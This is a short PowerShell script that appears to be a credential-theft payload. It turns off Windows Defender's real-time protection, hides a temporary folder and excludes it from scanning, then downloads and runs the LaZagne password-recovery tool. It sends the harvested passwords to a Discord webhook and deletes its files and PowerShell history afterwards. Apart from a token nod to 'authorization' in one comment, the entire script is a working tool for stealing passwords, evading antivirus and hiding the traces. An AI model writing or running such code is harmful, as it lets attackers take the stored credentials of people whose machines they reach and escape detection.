param (
    [string]$dc
)

# Validate that webhook URL was passed
if (-not $dc) {
    Write-Error "❌ Discord webhook URL is required. Usage: -dc <url>"
    exit 1
}

# ⚠️ TEMPORARILY Disable Defender (use only with authorization)
Set-MpPreference -DisableRealtimeMonitoring $true

# Create temp directory
$dir = "C:\Users\$env:UserName\Downloads\tmp"
New-Item -ItemType Directory -Path $dir -Force | Out-Null

# Exclude temp dir from Defender scans (⚠️ risky)
Add-MpPreference -ExclusionPath $dir

# Hide the temp directory
(Get-Item $dir -Force).Attributes = 'Hidden'

# Download LaZagne
$exePath = "$dir\lazagne.exe"
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe" -OutFile $exePath

# Run LaZagne and save output
$outputFile = "$dir\output.txt"
Start-Process -FilePath $exePath -ArgumentList "all" -NoNewWindow -Wait -RedirectStandardOutput $outputFile

# Read output content
$outputContent = Get-Content $outputFile -Raw

# Discord limit: max 2000 characters per message, we'll use ~1900 for safety
$message = if ($outputContent.Length -gt 1900) {
    $outputContent.Substring(0, 1900)
} else {
    $outputContent
}

# Format message for Discord (inside code block)
$payload = @{
    content = "```$message```"
} | ConvertTo-Json -Compress

# Send output to Discord webhook
Invoke-RestMethod -Uri $dc -Method Post -ContentType 'application/json' -Body $payload

# Clean up
Remove-Item -Path $dir -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-MpPreference -ExclusionPath $dir

# Clear PowerShell history and exit
Clear-History
exit
